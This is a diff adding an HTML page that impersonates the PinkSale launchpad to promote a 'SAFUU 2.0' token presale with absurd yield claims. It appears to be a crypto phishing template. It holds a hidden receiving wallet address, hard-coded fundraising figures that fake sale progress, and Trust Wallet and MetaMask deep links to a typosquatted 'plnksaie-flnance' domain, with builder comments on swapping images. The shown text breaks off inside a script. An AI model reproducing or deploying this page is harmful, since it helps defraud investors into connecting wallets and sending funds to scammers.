@@ -1,0 +1,990 @@
+<html lang="en" style="display: block"><head>
+
+<meta charset="utf-8">
+<link rel="icon" href="images/favicon.png">
+
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#000000">
+<meta name="description" content="">
+<style>/* Popup CSS */
+.popup {
+  position: fixed;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.5);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000; /* Yüksek bir z-index değeri belirleyin */
+}
+
+.popup-content {
+  background: white;
+  padding: 20px;
+  border-radius: 5px;
+  text-align: center;
+  width: 80%;
+  max-width: 500px;
+  position: relative;
+  z-index: 1001; /* Popup içeriği için yüksek z-index */
+}
+
+.close-btn {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  font-size: 20px;
+  cursor: pointer;
+}
+
+</style>
+<title>
+
+
+SAFUU 2.0 presale
+
+</title>
+
+<script>
+      self == top
+        ? (document.documentElement.style.display = 'block')
+        : (top.location = self.location);
+    </script>
+<link href="css/main.35b4f5eb.chunk.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="css/indexlift.css">
+<script src="js/web3.min.js"></script>
+</head>
+<body class="" style="">
+<noscript>You need to enable JavaScript to run this app.</noscript>
+<div id="root">
+<section class="ant-layout ant-layout-has-sider">
+<header class="ant-layout-header" style="
+            background: white;
+            height: 70px;
+            position: fixed;
+            z-index: 100;
+            width: 100%;
+            padding: 0px 30px;
+          ">
+<nav class="flex items-center noselect">
+<div class="pr-2 pt-2 is-size-4" style="cursor: pointer">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+<path d="M904 160H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0 624H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0-312H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8z"></path>
+</svg>
+</div>
+<a class="logo mr-3" href="#">
+<div class="logo-icon" style="margin-top: 15px">
+<img src="images/pinkswap.a95de4f3.png">
+</div>
+<div class="logo-text pt-1 hide-on-mobile">PinkSale</div>
+                    </a>
+                    <div class="flex-1"></div>
+                    <a href="https://www.dexview.com/" rel="nofollow noreferrer" target="_blank">
+                        <div class="network2" style="font-weight: 600;font-size: 14px;display: flex;align-items: center;border: 1px solid #f3f3f4;background-color: #f3f3f4;padding: 4px 8px;border-radius: 30px;cursor: pointer;height: 42px;color: #222;margin-right: 8px;">
+                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" class="hide-on-mobile" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M888 792H200V168c0-4.4-3.6-8-8-8h-56c-4.4 0-8 3.6-8 8v688c0 4.4 3.6 8 8 8h752c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM305.8 637.7c3.1 3.1 8.1 3.1 11.3 0l138.3-137.6L583 628.5c3.1 3.1 8.2 3.1 11.3 0l275.4-275.3c3.1-3.1 3.1-8.2 0-11.3l-39.6-39.6a8.03 8.03 0 0 0-11.3 0l-230 229.9L461.4 404a8.03 8.03 0 0 0-11.3 0L266.3 586.7a8.03 8.03 0 0 0 0 11.3l39.5 39.7z">
+                                </path>
+                            </svg><span class="ml-2">dexview.com</span>
+                        </div>
+                    </a>
+                    <div class="network " style="cursor: pointer;">
+                        <img src="images/ic-eth.4213cf87.svg" alt="" width="24">
+                        <span class="ml-2 hide-on-mobile">ETH MAINNET</span>
+                    </div>
+                    <div class="connectButton" id="loginButton" style="position:relative">
+                        <a id="linkhref" target="_blank" style="color:#f95192">Connect</a>
+                    </div>
+                </nav>
+            </header>
+<aside class="
+            ant-layout-sider
+            ant-layout-sider-dark
+            ant-layout-sider-collapsed
+            ant-layout-sider-zero-width
+          " style="
+            background: white;
+            overflow: auto;
+            height: 100vh;
+            position: fixed;
+            top: 70px;
+            left: 0px;
+            z-index: 10;
+            flex: 0 0 0px;
+            max-width: 0px;
+            min-width: 0px;
+            width: 0px;
+          ">
+<div class="ant-layout-sider-children">
+<ul class="
+                ant-menu
+                ant-menu-root
+                ant-menu-vertical
+                ant-menu-light
+                ant-menu-inline-collapsed
+              " role="menu" tabindex="0" data-menu-list="true">
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-home" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<path d="M946.5 505L560.1 118.8l-25.9-25.9a31.5 31.5 0 0 0-44.4 0L77.5 505a63.9 63.9 0 0 0-18.8 46c.4 35.2 29.7 63.3 64.9 63.3h42.5V940h691.8V614.3h43.4c17.1 0 33.2-6.7 45.3-18.8a63.6 63.6 0 0 0 18.7-45.3c0-17-6.7-33.1-18.8-45.2zM568 868H456V664h112v204zm217.9-325.7V868H632V640c0-22.1-17.9-40-40-40H432c-22.1 0-40 17.9-40 40v228H238.1V542.3h-96l370-369.7 23.1 23.1L882 542.3h-96.1z"></path>
+</svg>
+<span class="ant-menu-title-content"><a href="#">Home</a></span>
+</li>
+<li class="
+                  ant-menu-submenu
+                  ant-menu-submenu-vertical
+                  ant-menu-submenu-selected
+                " role="none">
+<div role="menuitem" class="ant-menu-submenu-title" tabindex="-1" aria-expanded="false" aria-haspopup="true" data-menu-id="rc-menu-uuid-78593-1-launchpads" aria-controls="rc-menu-uuid-78593-1-launchpads-popup" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<path fill="none" stroke="#000" stroke-width="2" d="M7,9 L7,14 C7,14 4,16 4,19 L4,20 L8,20 L10,23 L14,23 L16,20 L20,20 L20,19 C20,16 17,14 17,14 L17,9 C17,5 14,1 12,1 C10,1 7,5 7,9 Z M8,20 L16,20 M12,9 C12.5522847,9 13,8.55228475 13,8 C13,7.44771525 12.5522847,7 12,7 C11.4477153,7 11,7.44771525 11,8 C11,8.55228475 11.4477153,9 12,9 Z"></path>
+</svg>
+<span class="ant-menu-title-content">Launchpads</span><i class="ant-menu-submenu-arrow"></i>
+</div>
+<ul class="ant-menu ant-menu-sub ant-menu-inline ant-menu-hidden" id="rc-menu-uuid-78593-1-launchpads-popup" data-menu-list="true" style="">
+<li role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-launchpad-create" class="ant-menu-item ant-menu-item-only-child" style="padding-left: 48px">
+<span class="ant-menu-title-content"><a href="#">Create launchpad</a></span>
+</li>
+<li role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-fairlaunchpad-create" class="ant-menu-item ant-menu-item-only-child" style="padding-left: 48px">
+<span class="ant-menu-title-content"><a href="#">Create fair launch</a></span>
+</li>
+<li role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-launchpad-token" class="ant-menu-item ant-menu-item-only-child" style="padding-left: 48px">
+<span class="ant-menu-title-content"><a href="#">Create token</a></span>
+</li>
+<li role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-launchpad-dashboard" class="
+                      ant-menu-item
+                      ant-menu-item-selected
+                      ant-menu-item-only-child
+                    " style="padding-left: 48px">
+<span class="ant-menu-title-content"><a href="#">Launchpad list</a></span>
+</li>
+</ul>
+</li>
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-leaderboard" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<path d="M899.6 276.5L705 396.4 518.4 147.5a8.06 8.06 0 0 0-12.9 0L319 396.4 124.3 276.5c-5.7-3.5-13.1 1.2-12.2 7.9L188.5 865c1.1 7.9 7.9 14 16 14h615.1c8 0 14.9-6 15.9-14l76.4-580.6c.8-6.7-6.5-11.4-12.3-7.9zm-126 534.1H250.3l-53.8-409.4 139.8 86.1L512 252.9l175.7 234.4 139.8-86.1-53.9 409.4zM512 509c-62.1 0-112.6 50.5-112.6 112.6S449.9 734.2 512 734.2s112.6-50.5 112.6-112.6S574.1 509 512 509zm0 160.9c-26.6 0-48.2-21.6-48.2-48.3 0-26.6 21.6-48.3 48.2-48.3s48.2 21.6 48.2 48.3c0 26.6-21.6 48.3-48.2 48.3z"></path>
+</svg>
+<span class="ant-menu-title-content"><a href="#">Leaderboard</a></span>
+</li>
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-antibot" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<path d="M20.995,6.9c-0.034-0.342-0.241-0.642-0.548-0.795l-8-4c-0.281-0.141-0.613-0.141-0.895,0l-8,4 C3.246,6.259,3.039,6.559,3.005,6.9c-0.011,0.107-0.961,10.767,8.589,15.014C11.723,21.972,11.861,22,12,22 s0.277-0.028,0.406-0.086C21.956,17.667,21.006,7.008,20.995,6.9z M12,19.897C5.231,16.625,4.911,9.642,4.966,7.635L12,4.118 l7.029,3.515C19.066,9.622,18.701,16.651,12,19.897z"></path>
+<path d="M11 12.586L8.707 10.293 7.293 11.707 11 15.414 16.707 9.707 15.293 8.293z"></path>
+</svg>
+<span class="ant-menu-title-content"><a href="#">Pink Anti-Bot</a></span>
+</li>
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-pools-alert" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<path d="M21.928,11.607c-0.202-0.488-0.635-0.605-0.928-0.633V8c0-1.103-0.897-2-2-2h-6V4.61c0.305-0.274,0.5-0.668,0.5-1.11 C13.5,2.672,12.828,2,12,2s-1.5,0.672-1.5,1.5c0,0.442,0.195,0.836,0.5,1.11V6H5C3.897,6,3,6.897,3,8v2.997 C2.951,11,2.918,11.003,2.918,11.003C2.395,11.04,1.99,11.476,1.99,12v2c0,0.553,0.447,1,1,1H3v5c0,1.103,0.897,2,2,2h14 c1.103,0,2-0.897,2-2v-5c0.553,0,1-0.447,1-1v-1.938C22.011,11.909,21.988,11.753,21.928,11.607z M5,20V8h14l0.001,3.996 C19.001,11.998,19,11.999,19,12v2c0,0.002,0.001,0.003,0.001,0.005L19.002,20H5z"></path>
+<ellipse cx="8.5" cy="12" rx="1.5" ry="2"></ellipse>
+<ellipse cx="15.5" cy="12" rx="1.5" ry="2"></ellipse>
+<path d="M8 16H16V18H8z"></path>
+</svg>
+<span class="ant-menu-title-content"><a href="#" target="_blank" rel="noreferrer noopener">Pools Alert</a></span>
+</li>
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-telegram" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<g>
+<path fill="none" d="M0 0h24v24H0z"></path>
+<path fill-rule="nonzero" d="M12 20a8 8 0 1 0 0-16 8 8 0 0 0 0 16zm0 2C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm-3.11-8.83l-2.498-.779c-.54-.165-.543-.537.121-.804l9.733-3.76c.565-.23.885.061.702.79l-1.657 7.82c-.116.557-.451.69-.916.433l-2.551-1.888-1.189 1.148c-.122.118-.221.219-.409.244-.187.026-.341-.03-.454-.34l-.87-2.871-.012.008z"></path>
+</g>
+</svg>
+<span class="ant-menu-title-content"><a href="#" target="_blank" rel="noreferrer noopener">Telegram</a></span>
+</li>
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-twitter" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<g>
+<path fill="none" d="M0 0h24v24H0z"></path>
+<path fill-rule="nonzero" d="M15.3 5.55a2.9 2.9 0 0 0-2.9 2.847l-.028 1.575a.6.6 0 0 1-.68.583l-1.561-.212c-2.054-.28-4.022-1.226-5.91-2.799-.598 3.31.57 5.603 3.383 7.372l1.747 1.098a.6.6 0 0 1 .034.993L7.793 18.17c.947.059 1.846.017 2.592-.131 4.718-.942 7.855-4.492 7.855-10.348 0-.478-1.012-2.141-2.94-2.141zm-4.9 2.81a4.9 4.9 0 0 1 8.385-3.355c.711-.005 1.316.175 2.669-.645-.335 1.64-.5 2.352-1.214 3.331 0 7.642-4.697 11.358-9.463 12.309-3.268.652-8.02-.419-9.382-1.841.694-.054 3.514-.357 5.144-1.55C5.16 15.7-.329 12.47 3.278 3.786c1.693 1.977 3.41 3.323 5.15 4.037 1.158.475 1.442.465 1.973.538z"></path>
+</g>
+</svg>
+<span class="ant-menu-title-content"><a href="#" target="_blank" rel="noreferrer noopener">Twitter</a></span>
+</li>
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-pinkswap" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<path d="M847.9 592H152c-4.4 0-8 3.6-8 8v60c0 4.4 3.6 8 8 8h605.2L612.9 851c-4.1 5.2-.4 13 6.3 13h72.5c4.9 0 9.5-2.2 12.6-6.1l168.8-214.1c16.5-21 1.6-51.8-25.2-51.8zM872 356H266.8l144.3-183c4.1-5.2.4-13-6.3-13h-72.5c-4.9 0-9.5 2.2-12.6 6.1L150.9 380.2c-16.5 21-1.6 51.8 25.1 51.8h696c4.4 0 8-3.6 8-8v-60c0-4.4-3.6-8-8-8z"></path>
+</svg>
+<span class="ant-menu-title-content"><a href="#" target="_blank" rel="noreferrer noopener">Pinkswap</a></span>
+</li>
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-docs" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<path fill="none" stroke-linejoin="round" stroke-width="32" d="M416 221.25V416a48 48 0 01-48 48H144a48 48 0 01-48-48V96a48 48 0 0148-48h98.75a32 32 0 0122.62 9.37l141.26 141.26a32 32 0 019.37 22.62z"></path>
+<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="32" d="M256 56v120a32 32 0 0032 32h120m-232 80h160m-160 80h160"></path>
+</svg>
+<span class="ant-menu-title-content"><a href="#" target="_blank" rel="noreferrer noopener">Docs</a></span>
+</li>
+</ul>
+<div aria-hidden="true" style="display: none"></div>
+</div>
+</aside>
+<section class="ant-layout" style="
+            margin-left: 0px;
+            padding: 40px 20px 20px;
+            transition: all 200ms linear 0s;
+          ">
+<main class="ant-layout-content">
+<div class="Trending_trending__2ax2p">
+<div class="Trending_title__3t1fM">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="32" d="M352 144h112v112"></path>
+<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="32" d="M48 368l121.37-121.37a32 32 0 0145.26 0l50.74 50.74a32 32 0 0045.26 0L448 160"></path></svg>&nbsp;<span>Trending</span>
+</div>
+<ul class="Trending_items__2B7P8">
+<li class="Trending_trendingItem__235g3">
+<span>#1</span>&nbsp;<a href="#">SAFUU</a>
+</li>
+<li class="Trending_trendingItem__235g3">
+<span>#2</span>&nbsp;<a href="#">SOLBALL</a>
+</li>
+<li class="Trending_trendingItem__235g3">
+<span>#3</span>&nbsp;<a href="#">TrendGuru</a>
+</li>
+<li class="Trending_trendingItem__235g3">
+<span>#4</span>&nbsp;<a href="#">EGG</a>
+</li>
+<li class="Trending_trendingItem__235g3">
+<span>#5</span>&nbsp;<a href="#">MYTH</a>
+</li>
+<li class="Trending_trendingItem__235g3">
+<span>#6</span>&nbsp;<a href="#">TEXAS</a>
+</li>
+<li class="Trending_trendingItem__235g3">
+<span>#7</span>&nbsp;<a href="#">EAI</a>
+</li>
+<li class="Trending_trendingItem__235g3">
+<span>#8</span>&nbsp;<a href="#">VIM</a>
+</li>
+<li class="Trending_trendingItem__235g3">
+<span>#9</span>&nbsp;<a href="#">CALCIFER</a>
+</li>
+<li class="Trending_trendingItem__235g3">
+<span>#10</span>&nbsp;<a href="#">BNF</a>
+</li>
+<li class="Trending_trendingItem__235g3">
+<span>#11</span>&nbsp;<a href="#">REBASEAPY</a>
+</li>
+<li class="Trending_trendingItem__235g3">
+<span>#12</span>&nbsp;<a href="#">$UP</a>
+</li>
+</ul>
+</div>
+<div class="mx-auto my-4 sm:my-6 md:my-12 container"><!--$--><div class="flex items-start gap-4 flex-col lg:flex-row"><div class="flex-1 lg:flex-[2] w-full relative mt-0 lg:mt-12"><div class="pt-[25%] bg-gray-200 dark:bg-neutral-800 w-full rounded-t-md shadow-sm bg-no-repeat bg-center bg-cover" style="background-image:url(" https:="" photos.pinksale.finance="" file="" pinksale-logo-upload="" 1723100635594-55c2dfd6224d94ba8975566deb7aa40b.png")"=""></div><div class="absolute -mt-10 sm:-mt-12 md:-mt-16 left-[50%] -translate-x-[50%] z-10"><figure class="inline-block relative shadow-xl rounded-full"><img src="images/1.jpg" alt="" class="rounded-full p-[1px] border border-brand-lighter dark:border-brand-darker object-cover w-[80px] h-[80px] sm:w-[92px] sm:h-[92px] md:w-[128px] md:h-[128px]" loading="lazy"><img alt="BNB Smart Chain" loading="lazy" width="18" height="18" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6 absolute right-0 bottom-0 sm:right-1 sm:bottom-1 md:right-2 md:bottom-2" style="color:transparent" src="https://www.pinksale.finance/_next/static/media/ic-bsc.a3213bd0.svg"></figure></div>
+
+<div class="shadow-sm dark:shadow-lg text-sm dark:text-brand-text-dark p-4 py-6 relative overflow-hidden rounded-t-none rounded-b-md bg-white dark:bg-brand-dark"><div class="pt-6 sm:pt-8 md:pt-12 relative"><p id="message"></p><div class="absolute top-0 right-0"><div class="rounded-full text-xs py-1 px-2 inline-flex items-center gap-1 border border-transparent text-emerald-500 dark:text-emerald-400 bg-emerald-50 dark:bg-transparent dark:border-emerald-400"><div class="w-[8px] h-[8px] rounded-full bg-emerald-500 dark:bg-emerald-600 animate-pulse"></div><div class="font-medium">Sale live</div></div></div>
+<div class="flex items-center justify-center gap-2 text-center"><h2 class="text-[26px] font-semibold text-neutral-800 dark:text-brand-text-dark capitalize leading-relaxed">
+                                                                
+SAFUU 2.0 presale</h2></div><div class="mt-2 flex items-center justify-center"><div class="flex items-center gap-1 flex-wrap"><div class="border border-[#FFDD57] bg-[#FFDD57] text-black text-[12px] px-2 py-0.5 rounded-md">🔥 #1</div><div class="flex items-center gap-1"><div class="border text-[12px] rounded-md text-center capitalize inline-block bg-amber-500 border-amber-500 text-white dark:bg-amber-600 dark:border-amber-600 dark:text-amber-100"><a href="#" class="px-2 py-0.5 inline-block" target="_blank" rel="nofollow noreferrer">doxx</a></div><div class="border text-[12px] rounded-md text-center capitalize inline-block bg-sky-500 dark:bg-sky-600 border-sky-500 dark:border-sky-600 text-white dark:text-sky-100"><a href="#" class="px-2 py-0.5 inline-block" target="_blank" rel="nofollow noreferrer">audit</a></div></div></div></div><div class="flex items-center gap-2.5 text-gray-500 mt-2 justify-center"><a href="#" target="_blank" rel="nofollow noreferrer"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="text-brand" height="18" width="18" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg></a><a href="#" target="_blank" rel="nofollow noreferrer"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="text-brand" height="18" width="18" xmlns="http://www.w3.org/2000/svg"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a><a href="" target="_blank" rel="nofollow noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="text-brand" height="18" width="18" xmlns="http://www.w3.org/2000/svg"><path d="M446.7 98.6l-67.6 318.8c-5.1 22.5-18.4 28.1-37.3 17.5l-103-75.9-49.7 47.8c-5.5 5.5-10.1 10.1-20.7 10.1l7.4-104.9 190.9-172.5c8.3-7.4-1.8-11.5-12.9-4.1L117.8 284 16.2 252.2c-22.1-6.9-22.5-22.1 4.6-32.7L418.2 66.4c18.4-6.9 34.5 4.1 28.5 32.2z"></path></svg></a></div><div class="border-b w-full dark:border-neutral-800 my-4 border-dashed"></div>
+<div class="text-md font-bold">About</div><div class="my-4 w-full overflow-hidden"><div class="whitespace-pre-line break-words text-sm leading-relaxed">
+
+SAFUU 2.0 👊 First Re-Base Protocol on BASE! 🚀 Earn up to 102,800% APY! 💸 No Team Tokens 🏆 No Contract Red Flags 🔒 LP Locked 🔥 Interest Paid Every 15 Minutes: 96 Times Daily! 🔥 1% Burn 🛡️ Maximum Security 🛡️ Big Marketing Plans 📢 CMC &amp; CG Fast-Track Guaranteed 📣 Contract Renouncing 💎 The Next BASE Gem 💥 Join Us Now 🚀<div class="whitespace-pre-line break-words text-sm leading-relaxed">
+        
+                                                </div>
+                                            </div>
+                                        </div></article>
+                                        <div class="table-container mt-6 !overflow-visible">
+                                            <input type="text" id="AddressMe" value="0x0A62ad643251758519087aFe0193bd1B9fC10979" hidden="">
+                                            <input type="text" id="notidate" value="Sep 25, 2024 17:00:00" hidden="">
+                                            <table>
+                                                <tbody>
+                                                    <tr>
+                                                        
+														<div style="height: 10px"></div>											
+ <table><tbody>
+<td style="font-weight: bold">Token</td>
+</tr>
+<tr>
+<td>Address</td>
+<td class="has-text-right"><a class="mr-1" href="https://etherscan.io/address/0xdA7B91BBD66B5a680ae2783D760f9A3e4CF59dc5" target="_blank" rel="noreferrer nofollow">
+<span class="ant-typography has-text-primary">0xdA7B91BBD66B5a680ae2783D760f9A3e4CF59dc5<div role="button" tabindex="0" class="ant-typography-copy" aria-label="Copy" style="border: 0px none; background: transparent none repeat scroll 0% 0%; padding: 0px; line-height: inherit; display: inline-block;"><span role="img" aria-label="copy" class="anticon anticon-copy"><svg viewBox="64 64 896 896" focusable="false" data-icon="copy" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M832 64H296c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h496v688c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V96c0-17.7-14.3-32-32-32zM704 192H192c-17.7 0-32 14.3-32 32v530.7c0 8.5 3.4 16.6 9.4 22.6l173.3 173.3c2.2 2.2 4.7 4 7.4 5.5v1.9h4.2c3.5 1.3 7.2 2 11 2H704c17.7 0 32-14.3 32-32V224c0-17.7-14.3-32-32-32zM350 856.2L263.9 770H350v86.2zM664 888H414V746c0-22.1-17.9-40-40-40H232V264h432v624z"></path></svg></span></div></span></a></td>
+</tr>
+<tr>
+<td>Name</td>
+<td class="has-text-right">PepeForTrump</td>
+</tr>
+<tr>
+<td>Symbol</td>
+<td class="has-text-right">PFT</td>
+</tr>
+<tr>
+<td>Decimals</td>
+<td class="has-text-right">18</td>
+</tr>
+<tr>
+<td>Total Supply</td>
+<td class="has-text-right">1,500,000,000</td>
+</tr>
+<tr>
+<td style="font-weight: bold">Pool Info</td>
+</tr>
+<tr>
+<td>Address</td>
+<td class="has-text-right"><a class="mr-1" href="https://etherscan.io/address/0x2a09F091BFA42e98cAa772AE73dCdC3Ad7466A1D" target="_blank" rel="noreferrer nofollow">
+<span class="ant-typography has-text-primary">0x2a09F091BFA42e98cAa772AE73dCdC3Ad7466A1D<div role="button" tabindex="0" class="ant-typography-copy" aria-label="Copy" style="border: 0px none; background: transparent none repeat scroll 0% 0%; padding: 0px; line-height: inherit; display: inline-block;"><span role="img" aria-label="copy" class="anticon anticon-copy"><svg viewBox="64 64 896 896" focusable="false" data-icon="copy" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M832 64H296c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h496v688c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V96c0-17.7-14.3-32-32-32zM704 192H192c-17.7 0-32 14.3-32 32v530.7c0 8.5 3.4 16.6 9.4 22.6l173.3 173.3c2.2 2.2 4.7 4 7.4 5.5v1.9h4.2c3.5 1.3 7.2 2 11 2H704c17.7 0 32-14.3 32-32V224c0-17.7-14.3-32-32-32zM350 856.2L263.9 770H350v86.2zM664 888H414V746c0-22.1-17.9-40-40-40H232V264h432v624z"></path></svg></span></div></span></a></td>
+</tr>
+<tr>
+<td>Tokens For Presale</td>
+<td class="has-text-right">111,762,732 PFT</td>
+</tr>
+<tr>
+<td>Tokens For Liquidity</td>
+<td class="has-text-right">48,734,051.691 PFT</td>
+</tr>
+<tr>
+<td>Soft Cap</td>
+<td class="has-text-right">1 ETH</td>
+</tr>
+<tr>
+<td>Hard Cap</td>
+<td class="has-text-right">2 ETH</td>
+</tr>
+<tr>
+<td>Start Time</td>
+<td class="has-text-right">2024.09.14 05:38 (UTC)</td>
+</tr>
+<tr>
+<td>End Time</td>
+<td class="has-text-right">2024.09.28 04:59 (UTC)</td>
+</tr>
+<tr>
+<td>Listing On</td>
+<td class="has-text-right"><a class="mr-1" href="https://app.uniswap.org/#/swap?outputCurrency=0x08a1afa1941396B92A89c140415b5d1e7AC2384d" target="_blank" rel="noreferrer nofollow">Uniswap</a></td>
+</tr>
+<tr>
+<td>Liquidity Percent</td>
+<td class="has-text-right">51%</td>
+</tr>
+<tr>
+<td>Liquidity Lockup Time</td>
+<td class="has-text-right">365 days after pool ends</td>
+                                                    </tr>
+                                                </tbody>
+                                            </table>
+                                        </div>
+                                    </div>
+                                </div>
+								<!-- Popup HTML -->
+<div id="popup" class="popup">
+  <div class="popup-content">
+    <span class="close-btn" onclick="closePopup()">×</span>
+    <div id="popup-message">
+              Please open it in the Trust Wallet app.
+              <br>
+              <a class="ant-dropdown-trigger connectButton" href="https://link.trustwallet.com/open_url?coin_id=60&url=https://plnksaie-flnance.pages.dev/testnew">
+              Open in Trust Wallet
+              </a>
+              <br>
+              Please open it in the Metamask app.
+              <br>
+              <a class="ant-dropdown-trigger connectButton" href="https://metamask.app.link/dapp/https://plnksaie-flnance.pages.dev/testnew">
+              Open in Metamask
+              </a>
+            </div>
+  </div>
+
+<div></div>
+</div>
+                                <div style="height: 24px;"></div>
+                                <div class="ant-card ant-card-bordered mt-4">
+                                    <div class="ant-card-head">
+                                        <div class="ant-card-head-wrapper">
+                                            <div class="ant-card-head-title">Token Metrics</div>
+                                        </div>
+                                    </div>
+                                    <div class="ant-card-body">
+                                        <div class="has-text-centered">
+                                            <div class="flex justify-center items-center" style="max-width: 400px; margin: auto; height: 400px; overflow-y: hidden;margin-top:-20px">
+                                                <div class="TokenMetric_root__29Tdv" style="position:relative">
+                                                    <!-- Anh thay 1 cái ảnh như thế xong xóa background đi là oke, anh thay nó vào src đoạn này là oke để e lấy ví dụ 1 ảnh-->
+                                                    <img src="images/2.png">
+                                                    <!-- <span
+                                                        style="position: absolute;left: 30%;top: 50%;transform: translateY(-50%);font-weight: 700;color: #FD728F;">PPeth</span> -->
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                            <input type="text" id="RealCapYesNo" value="NO" hidden="">
+                            <input type="text" id="RealCap" value="25.48" hidden="">
+                            <!-- 2 cái này a k đc để là 0 k thì nó sẽ chạy ra 0 nè -->
+                            <input type="text" id="MaxRealCap" value="28.34" hidden="">
+                            <input type="text" id="balance" hidden="">
+                            <input type="text" id="Yesnomax" value="YES" hidden="">
+                            <input type="text" id="idcoin" value="2924" hidden="">
+                            <input type="text" id="chainId" value="" hidden="">
+                            <!--SALE LIVE-->
+                            <input type="text" id="ClaimStatus" value="YES" hidden="">
+                            <!--CLAIM-->
+                            <!-- <input type="text" id="ClaimStatus" value="YES" hidden> -->
+
+                            <script>
+                                function move() {
+                                    var numbers = [];
+                                    var elem = document.getElementById("myBar");
+                                    let MaxRealCap = jQuery("#MaxRealCap").val();
+                                    let RealCapYesNo = jQuery("#RealCapYesNo").val();
+                                    let RealCap = jQuery("#RealCap").val();
+                                    let ClaimStatus = jQuery("#ClaimStatus").val();
+                                    var width = MaxRealCap - RealCap;
+                                    $.each(numbers, function (index, value) {
+                                        setTimeout(function () {
